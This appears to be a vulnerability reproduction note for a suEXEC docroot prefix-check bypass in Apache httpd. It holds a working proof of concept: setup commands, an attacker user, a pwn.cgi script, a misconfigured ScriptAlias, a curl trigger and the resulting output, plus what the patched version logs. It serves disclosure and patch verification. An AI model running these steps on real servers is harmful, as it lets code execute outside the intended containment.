# 021 — suEXEC docroot prefix bypass

`support/suexec.c:550` enforces docroot containment with
`strncmp(cwd, dwd, strlen(dwd))`, so `/var/www_evil/...` passes the check
when `AP_DOC_ROOT=/var/www`.

## Setup

Platform: Linux. Build httpd with suEXEC enabled, hard-coding the document
root:

```bash
./configure --prefix=/usr/local/apache \
    --enable-suexec --with-suexec \
    --with-suexec-caller=www-data \
    --with-suexec-docroot=/var/www \
    --with-suexec-userdir=public_html \
    --with-suexec-logfile=/var/log/suexec.log
make -j && make install
chown root:www-data /usr/local/apache/bin/suexec
chmod 4750 /usr/local/apache/bin/suexec
```

Create a sibling tree owned by attacker user `mallory` (uid >= `MIN_UID`):

```bash
useradd -m -s /bin/bash mallory
mkdir -p /var/www_evil/cgi-bin
chown -R mallory:mallory /var/www_evil
cat > /var/www_evil/cgi-bin/pwn.cgi <<'EOF'
#!/bin/sh
echo "Content-Type: text/plain"; echo
id
echo "executed outside docroot"
EOF
chmod 755 /var/www_evil/cgi-bin/pwn.cgi
```

`httpd.conf` snippet (the alias is the administrator mistake the bypass
exploits — it points the script alias at a sibling path that shares a prefix):

```apache
LoadModule cgid_module modules/mod_cgid.so
LoadModule suexec_module modules/mod_suexec.so

ScriptAlias /evilcgi/ "/var/www_evil/cgi-bin/"
<Directory "/var/www_evil/cgi-bin">
    Options +ExecCGI
    SuexecUserGroup mallory mallory
    Require all granted
</Directory>
```

## Trigger

```bash
curl -v http://127.0.0.1/evilcgi/pwn.cgi
```

`mod_cgid` chdir()s to `/var/www_evil/cgi-bin/` before invoking suexec with
just the basename `pwn.cgi`. Inside `suexec.c`:

```text
dwd = "/var/www"
cwd = "/var/www_evil/cgi-bin"
strncmp(cwd, dwd, 8) == 0   -> bypass succeeds
```

## Observed effect

Body of the response:

```text
uid=1001(mallory) gid=1001(mallory) groups=1001(mallory)
executed outside docroot
```

`/var/log/suexec.log` shows a successful invocation and no `command not in
docroot` line. With the patched suexec the same request logs:

```text
command not in docroot (/var/www_evil/cgi-bin/pwn.cgi)
```

and curl receives a 500.

## Notes

The bypass requires the admin to map a `ScriptAlias` to a sibling-prefixed
path, but this is a routine misconfiguration — for example, `/var/www` and
`/var/www_staging` on the same host. The patch adds the boundary check so
only true descendants of `dwd` are accepted.
